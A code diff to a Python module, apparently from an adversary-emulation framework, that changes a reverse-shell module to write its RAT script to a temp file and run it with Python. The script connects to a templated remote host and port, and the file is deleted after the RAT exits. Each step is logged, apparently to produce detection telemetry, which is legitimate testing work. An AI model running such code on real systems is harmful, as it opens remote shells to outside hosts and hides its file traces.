@@ -3,26 +3,18 @@ try:
 except ImportError:
     pass
 
-class ReverseShell(ModuleBase):
+class ReverseShellOnDisk(ModuleBase):
     @property
     def tags(self):
-        return ['IntrusionSet2']
+        return ['IntrusionSet3']
 
     @property
     def relative_delay(self):
-        return 25
+        return 60
 
     @property
     def absolute_duration(self):
         return 60 * 60
-
-    def do_rat(self, rat):
-        c = compile(rat, '<string>', 'exec')
-        try:
-            eval(c, globals(), locals())
-        except KeyboardInterrupt as e:
-            pass
-        return
 
     def do_run(self):
         RAT_STRING = "# {banner}\n" \
@@ -50,10 +42,16 @@ class ReverseShell(ModuleBase):
                      "        pass\n"
         host = '${REMOTE_HOST}'
         port = '${REMOTE_PORT}'
+        import tempfile, os
         rat_string = RAT_STRING.format(banner=self._banner, host=host, port=port)
-        pid = self.util_childproc(func=self.do_rat, args=(rat_string,))
-        self.hec_logger('Kicked off the RAT', remote_host='{0}:{1}'.format(host, port), pid=pid)
+        handle, fname = tempfile.mkstemp(suffix='.${FILE_SUFFIX}', prefix='${FILE_PREFIX}-', dir='${FILE_DIRECTORY}')
+        os.write(handle, rat_string)
+        os.close(handle)
+        pid = self.util_childproc(fname='/usr/bin/python', args=('/usr/bin/python2.7', fname))
+        self.hec_logger('RAT has been started', filename=fname, pid=pid, remote_host='{0}:{1}'.format(host, port))
         self.util_orphanwait(pid, timeout=self.absolute_duration)
+        os.unlink(fname)
+        self.hec_logger('RAT exited, removed RAT script', filename=fname, pid=pid)
 
     def run(self):
         self.start()
